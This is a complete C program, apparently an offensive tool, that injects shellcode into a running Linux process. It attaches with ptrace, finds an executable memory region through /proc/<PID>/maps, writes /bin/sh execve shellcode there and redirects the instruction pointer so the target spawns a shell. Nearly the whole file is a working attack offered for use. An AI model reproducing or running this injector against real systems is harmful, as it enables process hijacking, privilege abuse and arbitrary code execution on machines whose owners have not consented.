#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>

#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>

#define MAX_NAME_LENGTH 64

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

// /bin/sh shellcode
// http://shell-storm.org/shellcode/files/shellcode-806.php
const char* shellcode = 
    "\x31\xc0\x48\xbb\xd1\x9d\x96"
    "\x91\xd0\x8c\x97\xff\x48\xf7"
    "\xdb\x53\x54\x5f\x99\x52\x57"
    "\x54\x5e\xb0\x3b\x0f\x05";

// Content from maps file is similar as follow:
// 7f65371ea000-7f653722c000 r--p 000fc000 08:01 2495889 /usr/lib/x86_64-linux-gnu/libcairo.so.2.11800.0
// First field is address, second field is for permission

// Extract permission from maps file
char* get_permissions(char* line) {
    char* token = strtok(line, " ");
    
    for (int i = 0; i < 2; i++) {
        token = strtok(NULL, " ");
        if (token == NULL)
            return NULL;
    }

    char* permissions = malloc(strlen(token) + 1);
    if (permissions == NULL)
        return NULL;
    strcpy(permissions, token);

    return permissions;
}

// Extract address from string
long find_address(char* line) {
    int address_last_idx = -1;
    long address;
    for (size_t i = 0; i < strlen(line); i++)
        if (line[i] == '-')
            address_last_idx = i;

    if (address_last_idx == -1) {
        warn("Could not get memory region's address");
        return -1;
    }

    char* address_line = malloc(address_last_idx + 1);
    if (address_line == NULL) {
        warn("Could not allocate memory");
        return -1;
    }

    for (size_t i = 0; i < address_last_idx; i++) 
        address_line[i] = line[i];

    address_line[address_last_idx] = '\0';
    address = strtol(address_line, NULL, 16);

    return address;
}

// `/proc/<PID>/maps` contains memory regions mapped by process
// Main idea is to find memory region with execute permissions 
// to inject shellcode to (e.g: r-xp), regardless of other permissions
long parse_maps(long pid) {
    char* maps_file = malloc(MAX_NAME_LENGTH);
    if (snprintf(maps_file, MAX_NAME_LENGTH, "/proc/%ld/maps", pid) < 0) {
        warn("Could not get maps file of given process: %s", strerror(errno));
        return -1;
    }

    // Open maps file
    FILE* maps = fopen(maps_file, "r");
    if (maps == NULL) {
        warn("Could not open %s file", maps_file);
        return -1;
    }
    
    long address;
    char* line = NULL;
    size_t maps_line_len = 0;
    while (getline(&line, &maps_line_len, maps) != -1) {
        char* perm = get_permissions(line);
        if (perm == NULL) {
            continue;
        } else if (strncmp(perm, "r-xp", 4) == 0) {
            info("Found section with %s permissions", perm);
            free(perm);
            break;
        }
        free(perm);
    }

    address = find_address(line);
    free(maps_file);

    return address;
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    long pid = atoi(argv[1]);

    // Attach to process
    if ((ptrace(PTRACE_ATTACH, pid, NULL, NULL)) < 0) {
        warn("Failed to attach: %s", strerror(errno));
        exit(EXIT_FAILURE);
    }
    okay("Attached to proces with PID: %ld", pid);
    
    // Get current register
    struct user_regs_struct old_regs;
    if ((ptrace(PTRACE_GETREGS, pid, NULL, &old_regs)) < 0) {
        printf("Failed to get registers: %s\n", strerror(errno));
        exit(EXIT_FAILURE);
    }

    size_t payload_size = strlen(shellcode);
    uint64_t* payload = (uint64_t *)shellcode;
    long address = parse_maps(pid);

    info("Injecting shellcode at 0x%lx", address);
    for (size_t i = 0; i < payload_size; i += 8, payload++) {
        if ((ptrace(PTRACE_POKETEXT, pid, address + i, *payload)) < 0) {
            warn("Failed to inject: %s", strerror(errno));
            exit(EXIT_FAILURE);
        }
    }

    // Jump to injected code
    struct user_regs_struct regs;
    info("Jumping to injected code");
    memcpy(&regs, &old_regs, sizeof(struct user_regs_struct));
    regs.rip = address;

    if ((ptrace(PTRACE_SETREGS, pid, NULL, &regs)) < 0) {
        warn("Failed to set RIP: %s", strerror(errno));
        exit(EXIT_FAILURE);
    }
    info("Redirected RIP to our shellcode");

    if ((ptrace(PTRACE_CONT, pid, NULL, NULL)) < 0) {
        warn("Failed to continue: %s", strerror(errno));
        exit(EXIT_FAILURE);
    }
    okay("Shellcode running...");

    okay("Done!");

    return 0;
}
